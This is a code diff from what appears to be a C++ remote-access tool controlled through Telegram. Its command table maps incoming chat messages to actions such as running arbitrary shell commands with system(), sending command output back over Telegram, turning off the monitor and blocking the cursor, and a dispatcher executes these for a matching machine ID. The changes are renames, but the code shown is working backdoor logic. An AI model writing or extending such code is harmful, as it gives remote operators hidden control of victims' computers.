@@ -19,7 +19,7 @@ std::vector <std::pair<std::string, void(*)(std::string)>> commands{
 	{"Status", getStatus},
 	{"SetID", setID},
 	{"Cmd", [](std::string cmd) { system(cmd.c_str()); }},
-	{"CmdOutput", [](std::string cmd) { telegram::SendText(tools::cmd_output(cmd.c_str())); }},
+	{"CmdOutput", [](std::string cmd) { telegram::SendText(tools::info::cmdOutput(cmd.c_str())); }},
 	{"FunctionList", [](std::string) {
 		std::string list;
 		for (auto& i : commands) {
@@ -32,7 +32,7 @@ std::vector <std::pair<std::string, void(*)(std::string)>> commands{
 	{"MonitorOff", monitorOff},
 	{"MonitorOn", monitorOn},
 	{"ChangeCfg", ChangeCfg},
-	{"CheckCfg", [](std::string) {telegram::SendText(tools::load_cfg().dump()); }},
+	{"CheckCfg", [](std::string) {telegram::SendText(tools::info::loadCfg().dump()); }},
 	{"SetCursor", SetCursor},
 	{"Delay", Delay},
 	{"BlockCursor", BlockCursor},
@@ -59,14 +59,14 @@ namespace execute {
 	void execute(parse::ParsedMessage PM) {
 		if (PM.ID != ID)
 			return;
-		std::cout << "Executing: " << PM.function << " with parameters: " << PM.parameters << std::endl;
+		std::cout << "Executing: " << PM.command << " with parameters: " << PM.parameters << std::endl;
 
 		for (auto &i : commands) {
-			if (tools::toLowerCase(i.first) == tools::toLowerCase(PM.function)) {
+			if (tools::toLowerCase(i.first) == tools::toLowerCase(PM.command)) {
 				i.second(PM.parameters);
 				return;
 			}
 		}
-		telegram::SendText(ID + ", function: " + PM.function + " not found. Try FunctionList to check possible functions.");
+		telegram::SendText(ID + ", function: " + PM.command + " not found. Try FunctionList to check possible functions.");
 	}
 }  // namespace execute
